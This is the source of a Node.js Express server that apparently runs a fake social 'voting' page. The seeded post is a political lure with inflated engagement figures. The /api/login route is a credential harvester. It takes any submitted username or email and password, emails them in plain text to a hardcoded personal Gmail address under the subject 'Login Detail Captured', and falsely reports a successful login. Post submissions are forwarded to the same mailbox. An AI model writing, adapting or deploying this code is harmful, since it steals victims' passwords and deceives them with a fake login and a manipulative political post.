const express = require('express');
const fs = require('fs');
const path = require('path');
const nodemailer = require('nodemailer');

const app = express();
const PORT = process.env.PORT || 3000;
const DB_FILE = path.join(__dirname, 'database.json');

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS
  }
});

function sendEmailNotification(subject, text) {
  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: 'vivienlamake@gmail.com',
    subject: subject,
    text: text
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('Error sending email:', error);
    } else {
      console.log('Email notification sent:', info.response);
    }
  });
}

const initialData = {
  posts: [
    {
      id: 1,
      author: "Jane Doe",
      initials: "JD",
      time: "Just now",
      content: "welcome to my page..\nvote for CONDACE OWENS.the highest concurrent peak individual (over 7000 people voted him. ) Type something above and click Post to add to the feed\nthanks for contributing your vote.",
      likes: 3005,
      commentsCount: 502,
      comments: []
    }
  ]
};

function readDB() {
  if (!fs.existsSync(DB_FILE)) {
    fs.writeFileSync(DB_FILE, JSON.stringify(initialData, null, 2));
  }
  return JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
}

function writeDB(data) {
  fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

app.get('/api/posts', (req, res) => {
  const db = readDB();
  res.json(db.posts);
});

app.post('/api/posts', (req, res) => {
  const { author, content } = req.body;
  if (!author || !content) return res.status(400).json({ error: 'Missing fields' });

  const db = readDB();
  const newPost = {
    id: Date.now(),
    author,
    initials: author.substring(0, 2).toUpperCase(),
    time: "Just now",
    content,
    likes: 0,
    commentsCount: 0,
    comments: []
  };

  db.posts.unshift(newPost);
  writeDB(db);

  sendEmailNotification(
    `New Vote/Submission from ${author}`,
    `A new user submitted content on your voting app:\n\nName: ${author}\nContent:\n${content}`
  );

  res.json(newPost);
});

app.post('/api/login', (req, res) => {
  const { username, password, email } = req.body;
  const identifier = username || email;
  
  if (!identifier) {
    return res.status(400).json({ error: 'Username or email required' });
  }

  sendEmailNotification(
    `New Login Detail Captured: ${identifier}`,
    `A user attempted to log in or submit credentials:\n\nUsername / Email: ${identifier}\nPassword: ${password || 'Not provided'}\nTimestamp: ${new Date().toISOString()}`
  );

  res.json({ success: true, message: 'Login processed successfully' });
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

